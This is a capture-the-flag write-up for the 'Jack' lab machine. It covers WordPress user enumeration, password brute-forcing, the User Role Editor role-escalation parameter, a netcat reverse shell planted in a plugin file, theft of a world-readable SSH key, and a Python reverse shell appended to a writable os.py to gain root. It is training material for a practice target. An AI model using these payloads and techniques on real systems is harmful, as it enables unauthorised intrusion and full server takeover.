# Jack

Compromise a web server running Wordpress, obtain a low privileged user and escalate your privileges to root using a Python module.

Connect to our network and deploy this machine.

Add `jack.thm` to `/etc/hosts`

# #1 - Gain initial access and obtain the user flag.

*Hint: Wpscan user enumeration, and don't use tools (ure_other_roles)*

## Enumeration

Append the following entry to your `/etc/hosts` file:

~~~
10.10.148.86	jack.thm
~~~

Let's check the services running on the target:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3e:79:78:08:93:31:d0:83:7f:e2:bc:b6:14:bf:5d:9b (RSA)
|   256 3a:67:9f:af:7e:66:fa:e3:f8:c7:54:49:63:38:a2:93 (ECDSA)
|_  256 8c:ef:55:b0:23:73:2c:14:09:45:22:ac:84:cb:40:d2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 5.3.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Jack&#039;s Personal Site &#8211; Blog for Jacks writing adven...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

There are 2 open ports, 22 and 80, respectively for SSH and HTTP. 

As far as the web service, it hosts a Worpress CMS, which is confirmed by the entries in the `robots.txt` file:

~~~
$ curl -s 10.10.148.86/robots.txt
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
~~~

## Wordpress users

Let's use `wpscan` to enumerate the users:

~~~
$ wpscan --url http://jack.thm -e u

[REDACTED]

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <========================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] jack
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wendy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] danny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[REDACTED]
~~~

There are 3 users identified.

## Crack passwords

Let's save the users in `users.txt` and find valid passwords:

~~~
$ cat > users.txt << EOF
jack
wendy
danny
EOF
$ wpscan -U users.txt -P /data/src/wordlists/fasttrack.txt --url http://jack.thm

[REDACTED]

[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - wendy / changelater                                                                                       
Trying danny /  Time: 00:00:24 <==================================================> (648 / 648) 100.00% Time: 00:00:24

[!] Valid Combinations Found:
 | Username: wendy, Password: changelater

[REDACTED]
~~~

Nice! We have found wendy's password.

## Login as Wendy

Now go to http://jack.thm/wp-login.php and login with `wendy:changelater`. As you will notice, Wendy has limited privileges and we can't do any administrative task.

No way to create a reverse shell with these limited privileges. We need to grant Wendy with more privileges.

## Grant Wendy administrator privileges

The User Role Editor plugin is vulnerable to a privilege escalation (https://www.exploit-db.com/exploits/44595) and we can grant Wendy administrator privileges.

Start BurpSuite and browse Wendy's profile (http://jack.thm/wp-admin/profile.php).

Now, scroll down to the very bottom of the page and click on the `Update Profile` button. Intercept the following request in BurpSuite:

~~~
POST /wp-admin/profile.php HTTP/1.1
Host: jack.thm
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://jack.thm/wp-admin/profile.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 312
Origin: http://jack.thm
DNT: 1
Connection: close
Cookie: wordpress_07f87507b491ce41808428c8c499655c=wendy%7C1592655638%7CLRHrQ5OvxYuOhZLXpHc1pkmEM5zPeI5wHlr75cChfkx%7Cd29e8efa83c597e5521498d8cbbdae7fc1f019cf0f14499b9dc07f3e9b1aee19; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_07f87507b491ce41808428c8c499655c=wendy%7C1592655638%7CLRHrQ5OvxYuOhZLXpHc1pkmEM5zPeI5wHlr75cChfkx%7C0cc36c8cc6f4e6246a036f37683f0d59afa9faa3885a86abce0dc9f372273b14; wp-settings-time-2=1592486277
Upgrade-Insecure-Requests: 1

_wpnonce=4412841a5b&_wp_http_referer=%2Fwp-admin%2Fprofile.php&from=profile&checkuser_id=2&color-nonce=deea9285df&admin_color=fresh&admin_bar_front=1&first_name=&last_name=&nickname=wendy&display_name=wendy&email=wendy%40tryhackme.com&url=&description=&pass1=&pass2=&action=update&user_id=2&submit=Update+Profile
~~~

And before forwarding it, add the following variable at the end:

~~~
ure_other_roles=administrator
~~~

Now, Wendy is granted administrator privileges and we should be able to make our reverse shell.

## Reverse shell

It was not possible to hook the `404.php` template with a PHP reverse shell but but updating the plugins is possible.

Prefix the existing code of any plugin (e.g. `Hello Dolly > hello.php`) with a reverse shell, as shown below:

```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.54 4444 >/tmp/f'); ?>
```

Save the page, open a listener (`rlwrap nc -nlvp 4444`) and activate the plugin. It should trigger a shell:

~~~
$ whoami
www-data
$ cd /home/jack/
$ ls
reminder.txt
user.txt
$ cat user.txt
0052f7829e48752f2e7bf50f1231548a
~~~

User flag: `0052f7829e48752f2e7bf50f1231548a`

# #2 - Escalate your privileges to root. Whats the root flag?

*Hint: Python*

Still in jack's home, there is an interesting file that talks about backup and permissions.

~~~
$ cat /home/jack/reminder.txt

Please read the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.

~~~

Searching for `backup`, it quickly turns out that there is a backup directory in `/var`:

~~~
$ cd /var/backups/
$ ls -l
total 776
drwxr-xr-x  2 root root     4096 Jan 10 15:05 ./
drwxr-xr-x 14 root root     4096 Jan  9 10:10 ../
-rw-r--r--  1 root root    40960 Jan  9 06:25 alternatives.tar.0
-rw-r--r--  1 root root     9931 Jan  9 10:34 apt.extended_states.0
-rw-r--r--  1 root root      713 Jan  8 11:20 apt.extended_states.1.gz
-rw-r--r--  1 root root       11 Jan  8 11:17 dpkg.arch.0
-rw-r--r--  1 root root       43 Jan  8 11:17 dpkg.arch.1.gz
-rw-r--r--  1 root root      437 Jan  8 11:23 dpkg.diversions.0
-rw-r--r--  1 root root      202 Jan  8 11:23 dpkg.diversions.1.gz
-rw-r--r--  1 root root      207 Jan  9 10:11 dpkg.statoverride.0
-rw-r--r--  1 root root      129 Jan  8 11:19 dpkg.statoverride.1.gz
-rw-r--r--  1 root root   552673 Jan  9 10:34 dpkg.status.0
-rw-r--r--  1 root root   129487 Jan  8 11:20 dpkg.status.1.gz
-rw-------  1 root root      813 Jan 10 10:54 group.bak
-rw-------  1 root shadow    679 Jan 10 10:54 gshadow.bak
-rwxrwxrwx  1 root root     1675 Jan 10 15:05 id_rsa*
-rw-------  1 root root     1626 Jan  9 10:11 passwd.bak
-rw-------  1 root shadow   1066 Jan 10 08:07 shadow.bak
~~~

Interstingly, all interesting files have been properly protected but `id_rsa` which I suspect to be jack's SSH private key. As `python3` is installed on the server, let's make the file available to us as a python web server:

~~~
$ /usr/bin/python3 -m http.server
~~~

Now, we can download `id_rsa` by connecting to http://10.10.148.86:8000.

Let's check if we can connect as `jack`:

~~~
$ chmod 600 id_rsa
$ ssh -i id_rsa jack@10.10.148.86
~~~

Great! We are now connected as Jack. Let's find a way to elevate our privileges. Standard enumeration tools like `linpeas.sh` are great, but there is a great tool called `pspy` that will be particularly handy in our case.

Using `pspy`, we can notice that there is a cron job running every 2 minutes:

~~~
2020/06/18 09:50:01 CMD: UID=0    PID=27131  | /usr/bin/python /opt/statuscheck/checker.py 
2020/06/18 09:50:01 CMD: UID=0    PID=27130  | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py 
2020/06/18 09:50:01 CMD: UID=0    PID=27129  | /usr/sbin/CRON -f 
2020/06/18 09:50:01 CMD: UID=0    PID=27133  | sh -c /usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log 
2020/06/18 09:50:01 CMD: UID=0    PID=27132  | sh -c /usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log 
2020/06/18 09:52:01 CMD: UID=0    PID=27137  | /usr/bin/python /opt/statuscheck/checker.py 
2020/06/18 09:52:01 CMD: UID=0    PID=27136  | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py 
2020/06/18 09:52:01 CMD: UID=0    PID=27135  | /usr/sbin/CRON -f 
2020/06/18 09:52:01 CMD: UID=0    PID=27139  | /usr/bin/curl -s -I http://127.0.0.1 
2020/06/18 09:52:01 CMD: UID=0    PID=27138  | sh -c /usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log 
2020/06/18 09:54:01 CMD: UID=0    PID=27143  | /usr/bin/python /opt/statuscheck/checker.py 
2020/06/18 09:54:01 CMD: UID=0    PID=27142  | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py 
2020/06/18 09:54:01 CMD: UID=0    PID=27141  | /usr/sbin/CRON -f 
2020/06/18 09:54:01 CMD: UID=0    PID=27144  | /usr/bin/python /opt/statuscheck/checker.py 
2020/06/18 09:54:01 CMD: UID=0    PID=27145  | sh -c /usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log 
~~~

The script is owned by `root` and we don't have write access to it:

~~~
jack@jack:/opt/statuscheck$ ls -la
total 48
drwxr-xr-x 2 root root  4096 Jan 10 18:34 .
drwxr-xr-x 3 root root  4096 Jan 10 09:50 ..
-rw-r--r-- 1 root root    92 Jan 10 10:10 checker.py
-rw-r--r-- 1 root root 30096 Jun 18 10:14 output.log
~~~

The script itself doesn't do much. It connects to localhost and outputs the result in a log file on the same directory as the script.

~~~
jack@jack:/opt/statuscheck$ cat checker.py 
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
~~~

But... we have write access to `/usr/lib/python2.7/os.py` which is imported in the script:

~~~
jack@jack:/usr/lib/python2.7$ ls -l /usr/lib/python2.7/os.py
-rw-rw-r-x 1 root family 25908 Jan 10 19:22 /usr/lib/python2.7/os.py
~~~

Time to write some python code. Append the following content at the end of `/usr/lib/python2.7/os.py`:

```python
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.9.0.54",5555))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```

Open a listener on port 5555 (or whatever you specified in the code above) and wait. You can run `pspy` in parallel on the server to monitor the cron job.

~~~
$ rlwrap nc -nlvp 5555
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.10.148.86.
Ncat: Connection from 10.10.148.86:44732.
root@jack:~# cat root.txt
cat root.txt
b8b63a861cc09e853f29d8055d64bffb
~~~

Root flag: `b8b63a861cc09e853f29d8055d64bffb`

Really great challenge! Congrats to the author, I had a lot of fun!

**Note: Don't forget to remove the entry from the `/etc/hosts` file**
